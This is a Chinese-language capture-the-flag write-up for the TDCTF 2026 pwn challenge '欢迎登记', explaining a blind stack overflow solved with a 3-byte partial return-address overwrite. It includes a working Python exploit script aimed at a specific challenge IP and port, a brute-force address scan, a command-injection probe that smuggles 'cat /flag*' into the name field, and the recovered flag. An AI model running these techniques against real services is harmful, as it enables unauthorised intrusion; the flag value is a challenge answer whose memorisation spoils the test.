---
title: "TDCTF 2026 Pwn 欢迎登记 wp"
slug: "tdctf-2026-pwn-huan-ying-deng-ji-wp"
date: 2026-11-23
updated: 2026-11-23
published: false
categories: ["CTF Writeup"]
tags: ["TDCTF 2026", "Pwn"]
---

# TDCTF 2026 Pwn 欢迎登记 wp

> 发布于 2026-11-23 05:47:00

迎新的登记系统，200 分，入口 `121.43.67.106:33368`。题目描述只有一句关键的提示：

> 迎新系统让你登记名字，但它对你的名字似乎没有任何限制。

连上去界面是这样的：

```
=== 通达学院 迎新登记 ===
请输入你的名字：
```

随便填个名字，程序会把名字原样回显，然后结束：

```
你好，test
登记完成，再见！
```

## 初步判断

「名字没有任何限制」这句话基本已经把考点摆到桌面上了：长度不限的输入 + 回显，指向栈溢出，而且很可能是 `gets()` / `scanf("%s")` 这类不检查边界的读入。

几个可以确认的点：

| 现象 | 结论 |
| --- | --- |
| 输入再长也不截断，全部回显 | 无边界读入 |
| 超长输入后程序直接异常退出（连接被断） | 覆盖到了返回地址，栈被打坏 |
| 覆盖 3 个字节就能跳到任意代码地址 | 二进制**不是 PIE**，高 4 字节固定为 `0x00000000` |
| 覆盖到返回地址也没有 canary 报错 | 没开栈保护（或 canary 不在覆盖路径上） |

于是栈布局是：

```
buf[64]        +0x00
saved RBP      +0x40   (64)
saved RIP      +0x48   (72)   <-- 溢出覆盖点
```

## 没有附件，盲扫 win 函数

这题没给二进制。既然不是 PIE，代码段就固定在 `0x400000` 附近，可以直接对着 `.text` 一地址一地址地试：把返回地址覆盖成候选地址，看回包里有没有 `flag{`。

扫描范围取 `0x401000 - 0x402000`，共 4096 个地址，32 并发，每个连接发：

```
b"A" * 72 + p64(addr)[:3] + b"\n"
```

结果命中 4 个相邻地址：

```
[HIT] 0x4011fb
[HIT] 0x4011fc
[HIT] 0x4011fe
[HIT] 0x4011ff
```

它们落在同一个函数里，入口取 `0x4011fb`。日志里大量 `[maybe] 0x4011xx` 都是名字被原样回显、没有出现 flag 的普通响应，不算命中。

扫描时顺手试过命令注入（把名字填成 `echo M4RK_$((40+2));cat /flag*`），回显证明输入没有被当成命令执行，排除这条路。

## 只覆盖 3 个字节的原因

`gets()` / `scanf("%s")` 读完字符串会在末尾补一个 `\0`。所以 payload 只写 3 个字节的地址，第 4 个字节由这个 `\0` 自动补上：

```
payload 末尾:  fb 11 40 00   ->   0x004011fb
```

如果老老实实写满 8 字节 `fb 11 40 00 00 00 00 00`，效果一样，但多写的高位字节没有意义，还容易把后面要用的字节压掉。3 字节版本更短、更稳。

## EXP

```python
#!/usr/bin/env python3
# TDCTF "欢迎登记" - stack overflow -> ret2win
# buf[64] + saved rbp[8] => return address at offset 72, no canary, no PIE
import socket, struct, sys, time
HOST, PORT = "121.43.67.106", 33368
WIN = int(sys.argv[1], 16) if len(sys.argv) > 1 else 0x4011fb
payload = b"A"*72 + struct.pack("<Q", WIN)[:3] + b"\n"   # gets() NUL-terminates -> 0x4011fb
s = socket.create_connection((HOST, PORT), timeout=8); s.settimeout(4)
time.sleep(0.3); s.sendall(payload)
out=b""; t=time.time()
while time.time()-t < 3:
    try:
        d=s.recv(65536)
        if not d: break
        out+=d
        if b"flag{" in out: break
    except socket.timeout: break
print(out.decode("utf-8","replace"))
```

运行：

```bash
python3 exploit.py 0x4011fb
```

回包：

```
=== 通达学院 迎新登记 ===
请输入你的名字：
你好，AAAA...AAAA\xfb\x11@
flag{ff2911fb-2a85-4b02-bc1b-9a7baf3872b8}
```

## Flag

```
flag{ff2911fb-2a85-4b02-bc1b-9a7baf3872b8}
```

## 小结

- 漏洞点：`buf[64]` + 无边界读入，返回地址在 offset 72。
- 保护：非 PIE、无 canary，返回地址可以直接硬编码。
- 定位：没有附件，用 3 字节部分覆盖盲扫 `.text`，`0x4011fb` 命中。
- 细节：`gets()` 末尾补的 `\0` 正好补上地址第 4 字节，所以只写 3 个字节就够。
